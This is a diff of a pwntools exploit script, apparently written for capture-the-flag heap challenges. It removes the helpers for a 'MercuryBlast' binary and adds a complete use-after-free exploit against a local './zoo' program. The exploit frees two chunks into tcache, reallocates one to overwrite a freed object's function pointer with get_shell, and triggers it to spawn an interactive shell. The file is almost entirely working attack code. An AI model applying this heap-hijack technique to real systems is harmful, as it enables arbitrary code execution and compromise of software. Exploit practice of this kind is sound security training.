@@ -24,57 +24,49 @@ def debug(breakpoint=''):
     gdbscript += 'directory %slibio/\n' % glibc_dir
     gdbscript += 'directory %self/\n' % glibc_dir
     gdbscript += 'set follow-fork-mode parent\n'
-    gdbscript += 'set resolve-heap-via-heuristic on\n'
     elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
     gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
     gdb.attach(p, gdbscript)
     time.sleep(1)
 
-elf = ELF("./MercuryBlast")
-libc = ELF("./libc-2.31.so")
+elf = ELF('./zoo')
 context(arch = elf.arch ,log_level = 'debug', os = 'linux')
+p = process("./zoo")
+get_shell = elf.symbols['get_shell']
 
-def add_record(temp, size, data):
-    sla("Your choice: ", "1")
-    sla("Input Temperature:", str(temp))
-    sla("Input Description Size: ", str(size))
-    sa("Input Description: ", data)
+def create(size, data):
+    sla("> ", "1")
+    sla("Type of animal?", "1")
+    sla("How long is the name? (max: 64 characters)", str(size))
+    sa("ame of animal", data)
 
-def print_record():
-    sla("Your choice: ", "2")
-    # sla("Input Index:", str(idx))
+def delete(idx):
+    sla("> ", "2")
+    sla("Zone number? (0-", str(idx))
 
-def delete_record(idx):
-    sla("Your choice: ", "3")
-    sla("Input Index:", str(idx))   
-
-def edit_record(idx, temp, size, data):
-    sla("Your choice: ", "4")
-    sla("Input index: ", str(idx))
-    sla("Input Temperature:", str(temp))
-    sla("Input Description Size: ", str(size))
-    sa("Input Description: ", data)
-
-def blast(data):
-    sla("Your choice: ", str('\x7f'))
-    se(data)
-
-read_bp = 0x167a
-
-def exp1():
-    add_record(1, 0x200, b'AAAAAAAA')
-    debug('''
-    b * delete_record
-    b * delete_record+63
-    ''')
-    delete_record(0)
-    p.interactive()
+def show(idx):
+    sla("> ", "3")
+    sla("one number", str(idx))
 
 
-def exp2():
-    p.interactive()
 
-    
-p = process("./MercuryBlast")
-exp1()
-# exp2()
+
+create(0x30, "a") #0
+
+create(0x30, "a") #1
+
+
+
+## after free heap chunk
+# . (0x20)Tcache_head -> animal_1 -> animal_0
+delete(0)
+
+delete(1)
+
+## buf_3 == animal_0
+create(0x18, p64(get_shell)) #2
+
+# debug("b *0x4018bf")
+## get_shell()
+show(0)
+p.interactive()
